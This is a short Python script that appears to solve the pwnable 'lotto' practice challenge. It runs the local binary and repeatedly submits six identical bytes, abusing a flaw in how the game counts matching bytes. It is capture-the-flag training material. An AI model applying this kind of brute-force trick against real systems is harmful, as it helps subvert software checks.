from subprocess import *  
from zio import *

target = "/home/pxx/program/pwnable/13-lotto/lotto"
class pio(object):
	def __init__(self, target, timeout = 9999):
		self.p = Popen(target, stdin=PIPE, stdout=PIPE)

	def read_until(self, text):
		buffer = ""
		while text not in buffer:
			buffer = buffer + self.p.stdout.read()
			print buffer
		print buffer
		return buffer

	def write(self, text):
		self.p.stdin.write(text)

io = pio(target, timeout = 9999)

while True:
	io.read_until("3. Exit\n")
	io.write("1\n")
	io.read_until("Submit your 6 lotto bytes : ")
	io.write("\x01\x01\x01\x01\x01\x01")

